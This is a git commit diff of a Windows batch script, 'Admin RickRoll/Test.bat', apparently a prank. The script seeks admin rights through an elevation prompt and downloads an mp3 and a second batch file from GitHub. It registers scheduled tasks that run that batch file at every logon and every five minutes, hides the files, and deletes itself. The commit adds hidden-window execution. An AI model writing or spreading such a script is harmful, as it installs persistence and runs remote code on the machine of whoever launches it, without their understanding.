ab5b67fdd94c7a3dd166ee1772b8393f8188302d
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2022-07-26 20:05:22 +0800

    Update Test.bat

--- Admin RickRoll/Test.bat
+++ Admin RickRoll/Test.bat
@@ -2,18 +2,19 @@
  whoami /all | findstr S-1-16-12288 > nul
  if %errorlevel%==1 goto NotAdmin
 cd /D "%~dp0"
-Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/rickroll.mp3' -OutFile .\rickroll.mp3
+Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/RickRoll.mp3' -OutFile .\rickroll.mp3
 Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/A.bat' -OutFile .\A.bat
-attrib +h A.bat
-attrib +h rickroll.mp3
 copy rickroll.mp4 "C:%homepath%"
 copy A.bat "C:%homepath%"
 Schtasks /create /sc ONLOGON /tn L /tr "C:%homepath%\A.bat" 
 Schtasks /create /sc DAILY /tn LOL /tr "C:%homepath%\A.bat" /ri 5 /du 24:00
+%homepath%
+attrib +h A.bat
+attrib +h rickroll.mp3
+cd /D "%~dp0"
 del A.bat
 del rickroll.mp3
 del Test.bat
-timeout -1
 exit
 timeout -1
 :NotAdmin
@@ -22,7 +23,7 @@ powershell -command "Start-Process Test.bat -Verb runas" && (
 timeout -1
 ) || (
   echo yourCommand failed
-powershell start .\Test.bat 
+powershell start .\Test.bat -windowstyle hidden
 exit
 )
 exit
